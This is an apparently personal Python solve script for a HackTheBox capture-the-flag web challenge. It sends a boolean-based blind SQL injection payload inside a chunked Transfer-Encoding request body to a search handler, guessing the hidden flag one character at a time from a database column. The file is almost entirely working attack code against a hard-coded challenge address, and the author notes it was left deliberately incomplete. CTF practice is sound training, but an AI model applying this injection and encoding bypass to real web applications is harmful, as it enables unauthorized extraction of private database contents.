#!/usr/bin/python3

# 0xboverchunked-solve.py - Exploit for HackTheBox "0xBOverchunked" challenge (https://app.hackthebox.com/challenges/0xBOverchunked).
# On this one, for some reason, every request made took about 7 seconds, making exploiting it really slow. 
# This exploit won't work on it's current state, since I assigned the value of the variable "flag" to an almost complete version of the final flag after waking up and noticing the 
# execution had stopped, and decided not to disclose it on this publication.

# The challenge itself was a boolean-based SQLi.

import requests
import string

headers = {
    'Host': '83.136.255.150:36197',
    # 'Content-Length': '115',
    'Accept': '*/*',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
    'Transfer-Encoding': 'chunked',
}


flag = "HTB{"

body_size = 131

found_char = ""

while found_char != "}":
    for char in string.printable:
        payload = f"search=1'+and+(SELECT+hex(substr(gamedesc,1,{len(flag) + 1}))+FROM+posts+WHERE+id=6+limit+1+offset+0)+==+hex('{flag}{char}')--\r\n0"
        data = f"{format(body_size, 'x')}\r\n{payload}"
        print(data)
        print("flag: ", flag,"\nchar: ", char)
        response = requests.post('http://83.136.255.150:36197/Controllers/Handlers/SearchHandler.php', headers=headers, data=data, verify=False)
        print(response.status_code)

        if response.status_code == 200:
            flag += char
            print(f'Found char: {char}')
            print(f'Formed flag: {flag}')
            body_size += 1
            found_char = char
            break
    
